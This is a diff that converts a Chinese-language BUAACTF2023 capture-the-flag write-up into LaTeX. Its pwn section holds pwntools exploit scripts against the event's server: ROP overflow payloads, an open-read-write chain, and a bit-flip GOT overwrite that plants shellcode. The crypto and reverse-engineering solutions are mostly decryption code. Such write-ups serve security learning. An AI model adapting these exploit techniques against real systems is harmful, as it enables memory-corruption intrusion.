@@ -1,15 +1,45 @@
+% Created 2023-04-27 Thu 14:18
+% Intended LaTeX compiler: pdflatex
+\documentclass[11pt]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{graphicx}
+\usepackage{longtable}
+\usepackage{wrapfig}
+\usepackage{rotating}
+\usepackage[normalem]{ulem}
+\usepackage{amsmath}
+\usepackage{amssymb}
+\usepackage{capt-of}
+\usepackage{hyperref}
+\author{John Doe}
+\date{\today}
+\title{}
+\hypersetup{
+ pdfauthor={John Doe},
+ pdftitle={},
+ pdfkeywords={},
+ pdfsubject={},
+ pdfcreator={Emacs 28.2 (Org mode 9.6.1)}, 
+ pdflang={English}}
+\begin{document}
+
+\tableofcontents
+
 ---
-title: "BUAACTF2023 WP"
+title: ``BUAACTF2023 WP''
 date: 2023-04-26T13:53:31+08:00
 tags: ['ctf', 'pwn']
 categories: ['life', 'learning']
 draft: false
-cover: "/img/2023-04-26_buaactf2023.png"
+cover: ``/img/2023-04-26\textsubscript{buaactf2023.png}''
 ---
-* crypto
-** Block Cipher
+\section{crypto}
+\label{sec:orgad136fb}
+\subsection{Block Cipher}
+\label{sec:org9416cbf}
 直接写个解密
-#+begin_src python
+\begin{verbatim}
 def decrypt(parts):
     iv = b'\xba=y\xa3\xc6)\xcf\xf7'
     key = b'}6E\xeb(\x91\x08\xa0'
@@ -17,12 +47,14 @@ def decrypt(parts):
     for index, part in enumerate(parts):
         results.append(reduce(xor, [part, iv if index == 0 else parts[index-1], key]))
     return results
-#+end_src
+\end{verbatim}
 
-* pwn
-** NLP
+\section{pwn}
+\label{sec:org2c4c82a}
+\subsection{NLP}
+\label{sec:org7d16117}
 pwntools使用。后面的信息提取有点恶心
-#+begin_src python
+\begin{verbatim}
 #encoding: utf-8
 from pwn import *
 p = remote("10.212.26.206", "23004")
@@ -144,10 +176,11 @@ for i in range(20):
     parse_ad()
     log.success("round"+str(i))
 p.interactive()
-#+end_src
-** pirate
+\end{verbatim}
+\subsection{pirate}
+\label{sec:org24866ad}
 跟着算法走一遍就行，然后rop跳到后门
-#+begin_src python
+\begin{verbatim}
 from pwn import *
 p = process("pirate")
 p = remote("10.212.26.206", "23002")
@@ -181,10 +214,11 @@ p.recvuntil("something.")
 payload = 'a'*16+p64(0x40101a)+p64(0x401236)
 p.sendline(payload)
 p.interactive()
-#+end_src
-** noshell
+\end{verbatim}
+\subsection{noshell}
+\label{sec:orgced94c0}
 基础orw
-#+begin_src python
+\begin{verbatim}
 from pwn import *
 p = process("noshell")
 p = remote("10.212.26.206", "23001")
@@ -224,13 +258,14 @@ p.recvuntil("?\n")
 payload3 = 'a'*16+p64(rspret)+p64(num)
 p.sendline(payload3)
 p.interactive()
-#+end_src
+\end{verbatim}
 
-** lose yourself
+\subsection{lose yourself}
+\label{sec:org7708e5c}
 给了一个mprotect后门让.text段可写。程序的功能是每次修改任意地址的1个bit。那思路就是想办法跳转到mprotect后门，然后在代码段写入shellcode，最后想办法跳过去。
 
 所以第一步是想办法跳到后门上。注意到在写完bit后用了一个exit。第一次修改就改exit的got。作者精心准备了一连串的空函数作为跳板，跟着走到最后能把exit的got改成后门地址。
-#+begin_src python
+\begin{verbatim}
 from pwn import *
 import binascii
 from Crypto.Util.strxor import strxor
@@ -250,9 +285,9 @@ flip_bit("404038", "6")
 flip_bit("404038", "7")
 flip_bit("404038", "2")
 flip_bit("404038", "1")
-#+end_src
+\end{verbatim}
 然后往0x10e1写入shellcode，这样就能通过改最后jmp地址的一位跳过去。
-#+begin_src python
+\begin{verbatim}
 # write shellcode
 dump_10e1 = binascii.unhexlify("50 54 49 C7 C0 10 13 40 00 48 C7 C1 A0 12 40 00 48 C7 C7 D5 11 40 00 FF 15 F2 2E 00 00 F4 90 F3 0F 1E FA C3 66 2E 0F 1F 84 00 00 00 00 00 90 B8".replace(" ", ""))
 shellcode = asm(shellcraft.amd64.linux.sh())
@@ -271,19 +306,30 @@ p.recvuntil("?")
 p.sendline("401299")
 p.sendline("0")
 p.interactive()
-#+end_src
-* re
-** snake
+\end{verbatim}
+\section{re}
+\label{sec:org21b000e}
+\subsection{snake}
+\label{sec:org3aa16d4}
 其实直接动态调试就能出来。但我开始没想到，用python des解密出来的。
-[[/img/2023-04-26_snake.png]]
+\begin{center}
+\includegraphics[width=.9\linewidth]{/img/2023-04-26_snake.png}
+\end{center}
 flag 用des加密后存在数据段。密钥直接写在代码里
-[[/img/2023-04-26_desdecrypt.png]]
-** minesweep
-[[/img/2023-04-26_minesweepenc.png]]
+\begin{center}
+\includegraphics[width=.9\linewidth]{/img/2023-04-26_desdecrypt.png}
+\end{center}
+\subsection{minesweep}
+\label{sec:orgc53ffdd}
+\begin{center}
+\includegraphics[width=.9\linewidth]{/img/2023-04-26_minesweepenc.png}
+\end{center}
 加密过程用到了mine数组，一个7*7，用字符‘a'和'b'表示。然后对flag前7个字符中的小写字母加密。第i个字符用mine中的第i行以及该字符后面的6个字符一起加密。这样只要从后往前恢复每个字符就行。但是mine在程序运行后会先计算周围的地雷数量。
-[[/img/2023-04-26_minecal.png]]
+\begin{center}
+\includegraphics[width=.9\linewidth]{/img/2023-04-26_minecal.png}
+\end{center}
 可以直接动调后再把mine倒出来解密。
-#+begin_src python
+\begin{verbatim}
 mine2 = [
     [0, 2, 2, 3, 3, 2, 3],
     [2, 4, 3, 2, 3, 2, 0],
@@ -311,12 +357,18 @@ for k in range(4, -1, -1):
     flag = tmpchr+flag
 
 print(flag)
-#+end_src
+\end{verbatim}
 
-** ezvm
+\subsection{ezvm}
+\label{sec:orgceee75b}
 初始化的地址做了1字节的偏移，ida上稍微调整一下。大致是malloc了两个结构体，第一个偏移0x40的地方用来存指令地址和ip，ZF，还有第二个结构的地址。第二个用来存输入字符串和加密后的flag。
-[[/img/2023-04-26_11e9.png]]
+\begin{center}
+\includegraphics[width=.9\linewidth]{/img/2023-04-26_11e9.png}
+\end{center}
 然后是痛苦的瞪。瞪了一下午硬逆了8条指令。
-[[/img/2023-04-26_ezvm.jpeg]]
+\begin{center}
+\includegraphics[width=.9\linewidth]{/img/2023-04-26_ezvm.jpeg}
+\end{center}
 最后解析指令集，发现只是简单的xor。
 以前没有怎么做过re，这次做这题本来是为了做pwn的ezvm。后面做pwn的时候感觉快出了但时间不太够了。。
+\end{document}
